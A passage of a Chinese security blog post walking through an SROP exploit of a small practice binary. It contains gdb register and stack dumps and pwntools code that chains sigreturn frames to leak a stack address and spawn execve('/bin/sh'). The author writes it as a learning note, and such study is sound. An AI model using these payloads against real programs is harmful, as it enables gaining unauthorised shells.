class="line">RSP: 0x7ffe2634a5f8 --&gt; 0x4000b3 (mov    edx,0x400)</span><br><span class="line">RIP: 0x4000c0 (ret)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4000b9:    mov    esi,esp</span><br><span class="line">   0x4000bb:    mov    rdi,rax</span><br><span class="line">   0x4000be:    syscall </span><br><span class="line">=&gt; 0x4000c0:    ret    </span><br><span class="line">   0x4000c1:    add    BYTE PTR [rsi],ch</span><br><span class="line">   0x4000c3:    jae    0x40012d</span><br><span class="line">   0x4000c5:    jae    0x40013b</span><br><span class="line">   0x4000c7:    jb     0x40013d</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7ffe2634a5f8 --&gt; 0x4000b3 (mov    edx,0x400)</span><br><span class="line">0008| 0x7ffe2634a600 --&gt; 0x4000b0 (xor    rax,rax)</span><br><span class="line">0016| 0x7ffe2634a608 --&gt; 0x7ffe2634c103 (&quot;NO_AT_BRIDGE=1&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>程序再次循环的时候，执行read(0，0x7ffe2634a5f8， 0x400)，传入一个\xb3修改内容。当执行下一次循环的时候，程序会write(1, 0x7ffe2634a608, 0x400)，也就是0x7ffe2634c103（在栈上保存着很多栈的地址，如果可以把这些地址打印出来，就可以获取一个栈上的地址，进而获得一个可以读写的地址）。</p>
+<p><strong> 第二步：构造read函数，将execve的frame写入0x7ffe2634c103，或者他的下几个单元处，这里选择写入下一个单元0x7ffe2634c0ed。</strong><br>首先把read函数的frame构造出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = 0x7ffe2634c0ed</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = 0x7ffe2634c0ed</span><br><span class="line">sigframe.rip = syscall_ret_addr</span><br></pre></td></tr></table></figure></p>
+<p>如果将这个frame写入到栈中，再考虑怎么去执行，恢复这个frame。<br>既然要恢复frame，则需要执行sigreturn，那么就是构造sigreturn执行需要的条件：rax=0xf；调用syscall。<br>刚才我们说到rax怎么去控制，这里可以通过读取15个字节来控制rax的值，然后程序执行syscall，也就是0x4000be。<br>构造payload：sigreturn = p64(syscall_ret) + ‘b’ <em> 7<br>因此操作分为两部分，首先读入p64(0x4000b0)+’a’</em>8+sigframe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x108 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x4000c0 (ret)</span><br><span class="line">RDX: 0x400 </span><br><span class="line">RSI: 0x7ffe2634a608 --&gt; 0x4000b0 (xor    rax,rax)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x0 </span><br><span class="line">RSP: 0x7ffe2634a608 --&gt; 0x4000b0 (xor    rax,rax)</span><br><span class="line">RIP: 0x4000c0 (ret)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4000b9:    mov    esi,esp</span><br><span class="line">   0x4000bb:    mov    rdi,rax</span><br><span class="line">   0x4000be:    syscall </span><br><span class="line">=&gt; 0x4000c0:    ret    </span><br><span class="line">   0x4000c1:    add    BYTE PTR [rsi],ch</span><br><span class="line">   0x4000c3:    jae    0x40012d</span><br><span class="line">   0x4000c5:    jae    0x40013b</span><br><span class="line">   0x4000c7:    jb     0x40013d</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7ffe2634a608 --&gt; 0x4000b0 (xor    rax,rax)</span><br><span class="line">0008| 0x7ffe2634a610 (&quot;aaaaaaaa&quot;)</span><br><span class="line">0016 | frame....</span><br></pre></td></tr></table></figure></p>
+<p>read函数执行完后，会继续进行下一次循环，再次读入相应payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0xf </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x4000c0 (ret)</span><br><span class="line">RDX: 0x400 </span><br><span class="line">RSI: 0x7ffe2634a610 --&gt; 0x4000be (syscall)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x0 </span><br><span class="line">RSP: 0x7ffe2634a610 --&gt; 0x4000be (syscall)</span><br><span class="line">RIP: 0x4000c0 (ret)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">...</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7ffe2634a610 --&gt; 0x4000be (syscall)</span><br><span class="line">0008| 0x7ffe2634a618 --&gt; 0x62626262626262 (&apos;bbbbbbb&apos;)</span><br><span class="line">0016| 0x7ffe2634a620 --&gt; 0x0</span><br></pre></td></tr></table></figure></p>
+<p>然后程序执行ret后进行syscall调用，就会执行sigreturn系统调用，将frame进行恢复。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0xf </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x4000c0 (ret)</span><br><span class="line">RDX: 0x400 </span><br><span class="line">RSI: 0x7ffe2634a610 --&gt; 0x4000be (syscall)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x0 </span><br><span class="line">RSP: 0x7ffe2634a618 --&gt; 0x62626262626262 (&apos;bbbbbbb&apos;)</span><br><span class="line">RIP: 0x4000be (syscall)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4000b2:    sar    BYTE PTR [rdx+0x400],0x48</span><br><span class="line">   0x4000b9:    mov    esi,esp</span><br><span class="line">   0x4000bb:    mov    rdi,rax</span><br><span class="line">=&gt; 0x4000be:    syscall </span><br><span class="line">   0x4000c0:    ret    </span><br><span class="line">   0x4000c1:    add    BYTE PTR [rsi],ch</span><br><span class="line">   0x4000c3:    jae    0x40012d</span><br><span class="line">   0x4000c5:    jae    0x40013b</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x0 </span><br><span class="line">arg[1]: 0x7ffe2634a610 --&gt; 0x4000be (syscall)</span><br><span class="line">arg[2]: 0x400 </span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7ffe2634a618 --&gt; 0x62626262626262 (&apos;bbbbbbb&apos;)</span><br><span class="line">0008| 0x7ffe2634a620 --&gt; 0x0</span><br></pre></td></tr></table></figure></p>
+<p>现在就是再执行向0x7ffe2634c0ed写内容的write函数了。</p>
+<p><strong> 第三步：写入shellcode </strong><br>把之前分析的shellcode构造出来，进行写入就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x120  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe) </span><br><span class="line">shellcode = frame_payload + (0x120 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br></pre></td></tr></table></figure></p>
+<p>恢复frame，还是用第二步的方法，将p64(0x4000b0)+’a’*8+sigframe写入，然后执行写入的syscall，进行sigreturn系统调用，就会将execve(‘/bin/sh’,0,0)的frame就行恢复，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RAX: 0x3b (&apos;;&apos;)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x0 </span><br><span class="line">RDX: 0x0 </span><br><span class="line">RSI: 0x0 </span><br><span class="line">RDI: 0x7ffe2634c20d --&gt; 0x68732f6e69622f (&apos;/bin/sh&apos;)</span><br><span class="line">RBP: 0x0 </span><br><span class="line">RSP: 0x7ffe2634c0ed --&gt; 0x4000b0 (xor    rax,rax)</span><br><span class="line">RIP: 0x4000be (syscall)</span><br></pre></td></tr></table></figure></p>
+<p>这样就可以执行execve(‘/bin/sh’,0,0)了。</p>
+<p><strong> 最后总结一下流程，大体如下：</strong><br>1、随便泄漏一个栈地址<br><img src="/image/20201222/image5.png" alt="image"></p>
+<p>2、写入read(0,stack_addr,0x400)的SigreturnFrame，进而通过执行sigreturn的系统调用，执行read(0,stack_addr,0x400)<br><img src="/image/20201222/image6.png" alt="image"></p>
+<p>3、写入execve(‘/bin/sh’,0,0)的SigreturnFrame，进而通过执行sigreturn的系统调用，执行execve(‘/bin/sh’,0,0)<br><img src="/image/20201222/image7.png" alt="image"></p>
+<blockquote>
+<h2 id="附表"><a href="#附表" class="headerlink" title="附表"></a>附表</h2></blockquote>
+<table>
+<thead>
+<tr>
+<th>系统调用</th>
+<th>调用号</th>
+<th>函数原型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>read</td>
+<td>0(0x0)</td>
+<td>read(int fd, void *buf, size_t count)</td>
+</tr>
+<tr>
+<td>write</td>
+<td>1(0x1)</td>
+<td>write(int fd, const void *buf, size_t count)</td>
+</tr>
+<tr>
+<td>sigreturn</td>
+<td>15(0xf)</td>
+<td>int sigreturn(…)</td>
+</tr>
+<tr>
+<td>execve</td>
+<td>59(0x3b)</td>
+<td>execve(const char <em>filename, char </em>const argv[],char *const envp[])</td>
+</tr>
+</tbody>
+</table>
+<h1 id="0x04-尾记"><a href="#0x04-尾记" class="headerlink" title="0x04 尾记"></a>0x04 尾记</h1><p> 还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。</p>
+<blockquote>
+<p>参考:<br><a href="https://github.com/torvalds/linux/tree/v3.13/arch/x86/ia32" target="_blank" rel="noopener">linux kernel</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/srop-zh/" target="_blank" rel="noopener">ctfwiki</a><br><a href="https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/" target="_blank" rel="noopener">the-definitive-guide-to-linux-system-calls</a><br><a href="https://www.binss.me/blog/the-analysis-of-linux-system-call/" target="_blank" rel="noopener">the-analysis-of-linux-system-call</a><br><a href="https://lwn.net/Articles/676803/" target="_blank" rel="noopener">Sigreturn-oriented programming and its mitigation</a><br><a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" target="_blank" rel="noopener">Framing Signals — A Return to Portable Shellcode</a></p>
+</blockquote>
+
+      
+    </div>
+	<div>
+      
+          <div>
+     
+        <div style="text-align:center;color: #ccc;font-size:15px;">
+              -------------本文结束&感谢您的阅读-------------
+        </div>
+</div>
+      
+	</div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    bey0ndm3
+  </li>
+    <li class="post-copyright-author">
+    <strong>Post title:</strong>
+    <a href="/2020/12/22/1/">FramingSignals-AReturntoPortableShellcode(SROP)</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>Publishing time:</strong>
+    2020年12月22日 - 20:12
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://1234xxh.github.io/2020/12/22/1/" title="FramingSignals-AReturntoPortableShellcode(SROP)">http://1234xxh.github.io/2020/12/22/1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+  <li>转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/二进制安全/" rel="tag"># 二进制安全</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/14/1/" rel="next" title="知识点回顾之Pyhon模版注入">
+                <i class="fa fa-chevron-left"></i> 知识点回顾之Pyhon模版注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zODU3Ni8xNTEwNA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/background.jpg"
+                alt="bey0ndm3" />
+            
+              <p class="site-author-name" itemprop="name">bey0ndm3</p>
+              <p class="site-description motion-element" itemprop="description">我的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/virgilwjj/" title="virgilwjj" target="_blank">virgilwjj</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-背景知识"><span class="nav-number">2.</span> <span class="nav-text">0x02 背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#系统调用"><span class="nav-number">2.1.</span> <span class="nav-text">系统调用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是系统调用"><span class="nav-number">2.1.1.</span> <span class="nav-text">什么是系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统调用种类"><span class="nav-number">2.1.2.</span> <span class="nav-text">系统调用种类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#传统系统调用"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">传统系统调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#快速系统调用"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">快速系统调用</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-srop"><span class="nav-number">3.</span> <span class="nav-text">0x03 srop</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是srop"><span class="nav-number">3.1.</span> <span class="nav-text">什么是srop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#怎么样srop"><span class="nav-number">3.2.</span> <span class="nav-text">怎么样srop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附表"><span class="nav-number">3.3.</span> <span class="nav-text">附表</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-尾记"><span class="nav-number">4.</span> <span class="nav-text">0x04 尾记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bey0ndm3</span>
+
+  
+</div>
+
+<p>My way of tramp journey is from the galaxy's firmament to the starry ocean.</p>    <!--文字-->
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
